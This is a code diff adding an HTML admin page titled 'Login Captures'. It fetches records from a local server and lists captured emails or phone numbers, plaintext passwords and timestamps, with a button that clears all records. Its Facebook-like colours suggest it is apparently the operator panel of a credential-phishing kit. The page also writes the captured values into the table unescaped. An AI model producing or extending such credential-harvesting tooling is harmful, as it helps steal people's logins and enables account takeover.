@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Login Captures</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            text-align: left;
+            padding: 12px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        th {
+            background-color: #f0f2f5;
+            color: #333;
+        }
+
+        tr:hover {
+            background-color: #f9f9f9;
+        }
+
+        .controls {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        button {
+            background-color: #e41e3f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:hover {
+            background-color: #c41935;
+        }
+
+        .refresh-btn {
+            background-color: #1877f2;
+            margin-right: 10px;
+        }
+
+        .refresh-btn:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Admin Dashboard</h1>
+        <div class="controls">
+            <button class="refresh-btn" onclick="fetchData()">Refresh Data</button>
+            <button onclick="clearData()">Clear All Data</button>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Email / Phone</th>
+                    <th>Password</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="data-body">
+                <!-- Data will be inserted here -->
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        // Fetch data on load
+        document.addEventListener('DOMContentLoaded', fetchData);
+
+        function fetchData() {
+            fetch('http://localhost:3000/admin-data')
+                .then(response => response.json())
+                .then(data => {
+                    const tbody = document.getElementById('data-body');
+                    tbody.innerHTML = '';
+
+                    if (data.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">No data found</td></tr>';
+                        return;
+                    }
+
+                    data.forEach(row => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td>${row.id}</td>
+                            <td>${row.email}</td>
+                            <td>${row.password}</td>
+                            <td>${new Date(row.timestamp).toLocaleString()}</td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                })
+                .catch(err => console.error('Error fetching data:', err));
+        }
+
+        function clearData() {
+            if (confirm('Are you sure you want to delete ALL records?')) {
+                fetch('http://localhost:3000/clear-data', { method: 'POST' })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert(data.message);
+                        fetchData();
+                    })
+                    .catch(err => console.error('Error clearing data:', err));
+            }
+        }
+    </script>
+</body>
+
+</html>
